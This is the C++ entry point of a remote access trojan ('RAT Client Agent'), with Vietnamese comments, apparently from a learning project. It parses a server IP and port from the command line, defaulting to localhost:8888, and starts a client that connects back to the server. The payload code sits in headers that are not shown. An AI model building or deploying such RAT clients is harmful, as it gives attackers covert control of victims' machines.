#include "client.h"
#include "protocol.h"

#include <iostream>
#include <string>

int main(int argc, char* argv[]) {
    std::string host = RAT::DEFAULT_HOST; // Mặc định là "127.0.0.1"
    int port = RAT::DEFAULT_PORT;         // Mặc định là 8888

    // Cho phép truyền IP và Port từ dòng lệnh:
    // Cú pháp: ./bin_client [IP_Server] [Port_Server]
    if (argc >= 2) {
        host = argv[1];
    }
    if (argc >= 3) {
        try {
            port = std::stoi(argv[2]);
            if (port <= 0 || port > 65535) {
                std::cerr << "[!] Port khong hop le (1 - 65535). Dung port mac dinh " << RAT::DEFAULT_PORT << "\n";
                port = RAT::DEFAULT_PORT;
            }
        } catch (const std::exception&) {
            std::cerr << "[!] Tham so Port sai dinh dang. Dung port mac dinh " << RAT::DEFAULT_PORT << "\n";
            port = RAT::DEFAULT_PORT;
        }
    }

    std::cout << "[*] Khoi dong RAT Client Agent...\n";
    std::cout << "[*] Ket noi toi Server tai: " << host << ":" << port << "\n";

    // Khởi tạo đối tượng Client và bắt đầu chạy
    RAT::Client client(host, port);
    client.start();

    std::cout << "[*] Client da dung hoat dong.\n";
    return 0;
}